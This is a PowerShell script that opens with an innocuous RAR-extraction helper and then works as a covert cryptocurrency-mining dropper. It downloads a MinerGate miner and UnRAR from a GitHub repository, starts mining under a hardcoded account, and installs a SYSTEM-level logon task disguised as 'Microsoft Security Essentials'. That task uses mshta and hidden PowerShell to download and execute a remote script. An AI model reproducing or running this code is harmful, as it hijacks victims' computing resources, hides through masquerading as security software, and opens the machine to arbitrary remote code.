$Script:unrarName =  "UnRAR.exe"
  
function Extract-RAR-File([string]$FilePath, [string]$DestinationFolder, [bool]$RemoveSuccessful= $false) 
{	
<#
    .Synopsis
        unrars a file or set of rar files, then if "all ok"
        removes or moves the original rar files
    .Example
        Extract-RAR-File c:\temp\foo.rar
        Extracts contents of foo.rar to folder temp.
    .Parameter FilePath
        path to rar file 
    .Parameter RemoveSuccessful
        remove rar files if successful otherwise move files to folder called trash
    .Link
        http://heazlewood.blogspot.com
#>
     
    # Verify we can access UNRAR.EXE .
 if ([string]::IsNullOrEmpty($unrarName) -or (Test-Path -LiteralPath $unrarName) -ne $true)
 {
     Write-Error "Unrar.exe path does not exist '$unrarPath'."
        return
    }
  
    [string]$unrarPath = $(Get-Command $unrarName).Definition
    if ( $unrarPath.Length -eq 0 )
    {
        Write-Error "Unable to access unrar.exe at location '$unrarPath'."
        return
    }
 
   # Verify we can access to the compressed file.
 if ([string]::IsNullOrEmpty($FilePath) -or (Test-Path -LiteralPath $FilePath) -ne $true)
 {
     Write-Error "Compressed file does not exist '$FilePath'."
        return
    }
  
    [System.IO.FileInfo]$Compressedfile = get-item -LiteralPath $FilePath
     
    #set Destination to basepath folder
    #$fileBaseName = [System.IO.Path]::GetFileNameWithoutExtension($Compressedfile.Name)
    #$DestinationFolder = join-path -path $Compressedfile.DirectoryName -childpath $fileBaseName
     
    #set Destination to parent folder
    $DestinationFolder
 
    # If the extract directory does not exist, create it.
    CreateDirectoryIfNeeded ( $DestinationFolder ) | out-null
 
    Write-Output "Extracting files into $DestinationFolder"
    &$unrarPath x -y  $FilePath $DestinationFolder | tee-object -variable unrarOutput 
     
    #display the output of the rar process as verbose
    $unrarOutput | ForEach-Object {Write-Verbose $_ }
      
    if ( $LASTEXITCODE -ne 0 )
    { 
        # There was a problem extracting. 
        #Display error
        Write-Error "Error extracting the .RAR file"
    }
    else
    {
        # check $unrarOutput to remove files
        Write-Verbose "Checking output for OK tag" 
    }
}
 
function CreateDirectoryIfNeeded ( [string] $Directory ){
<#
    .Synopsis
        checks if a folder exists, if it does not it is created
    .Example
        CreateDirectoryIfNeeded "c:\foobar"
        Creates folder foobar in c:\
    .Link
        http://heazlewood.blogspot.com
#>
    if ((test-path -LiteralPath $Directory) -ne $True)
    {
        New-Item $Directory-type directory | out-null
         
        if ((test-path -LiteralPath $Directory) -ne $True)
        {
            Write-error ("Directory creation failed")
        }
        else
        {
            Write-verbose ("Creation of directory succeeded")
        }
    }
    else
    {
        Write-verbose ("Creation of directory not needed")
    }
}

$dir = $env:AppData
$lcard =  $(wmic path win32_VideoController get name)
$numprocessor = $env:NUMBER_OF_PROCESSORS
$minerrar = $dir+"\MinerGate-cli-4.04-win64.rar"
$file = "$dir\UnRAR.exe"
$miner = $minerrar.replace(".rar","")


if($(Test-Path $miner) -eq $False){
	$client = new-object System.Net.WebClient
	$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/Hanako-Yumi/master/MinerGate-cli-4.04-win64.rar'
	$client.DownloadFile($url,$minerrar)

	$client = new-object System.Net.WebClient
	$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/Hanako-Yumi/master/UnRAR.exe'
	$client.DownloadFile($url,$file)
	Extract-RAR-File "MinerGate-cli-4.04-win64.rar" "$dir"
}

if($lcard -like "*NVIDIA*"){
	if($numprocessor -ne $NULL){
		[System.Diagnostics.Process]::Start("$miner\minergate-cli.exe", "-user gh0st1nth3sh3lluit@gmail.com -bcn $($numprocessor/2) 2")
	}
	else{
		[System.Diagnostics.Process]::Start("$miner\minergate-cli.exe", "-user gh0st1nth3sh3lluit@gmail.com -bcn 2 2")
	}
}
else{
	if($numprocessor -ne $NULL){
		[System.Diagnostics.Process]::Start("$miner\minergate-cli.exe", "-user gh0st1nth3sh3lluit@gmail.com -bcn $($numprocessor/2)")
	}
	else{
		[System.Diagnostics.Process]::Start("$miner\minergate-cli.exe", "-user gh0st1nth3sh3lluit@gmail.com -bcn 2")
	}
}
########
$persistent = $(schtasks.exe /Query /tn "Microsoft Security Essentials")
if($persistent -eq $NULL){
	$scheduler = New-Object -ComObject Schedule.Service
	$scheduler.Connect()
	$task = $scheduler.NewTask(0)
	$task.RegistrationInfo.Description = "Microsoft Security Essentials"
	$task.Principal.RunLevel = 1
	$task.Principal.UserId = "SYSTEM"
	$task.Settings.DisallowStartIfOnBatteries = $false
	$task.Settings.Enabled = $true
	$task.Settings.Priority = 6 # [1-10]
	$task.Settings.RunOnlyIfNetworkAvailable = $True
	$task.Settings.StopIfGoingOnBatteries = $false
	$task.Settings.MultipleInstances = 2

	$Action = $Task.Actions.Create(0)
	$Action.WorkingDirectory = ""
	$Action.Path = "mshta.exe"
	$Action.Arguments = "vbscript:Execute(`"CreateObject(`"`"WScript.Shell`"`").Run`"`"powershell.exe -nop -w hidden -c `"`"`"`"iex ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/Hanako-Yumi/master/Bitcoin.ps1'))`"`"`"`"`"`", 0:code close`")"

	$Trigger = $Task.Triggers.Create(9) #Logon
	$fol = $scheduler.GetFolder("$Folder")
	$fol.RegisterTaskDefinition("Microsoft Security Essentials", $Task, 6, "", "", 3, $null)
}
